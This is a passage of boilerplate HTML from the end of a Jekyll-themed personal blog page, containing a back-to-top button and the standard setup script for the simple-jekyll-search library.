mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
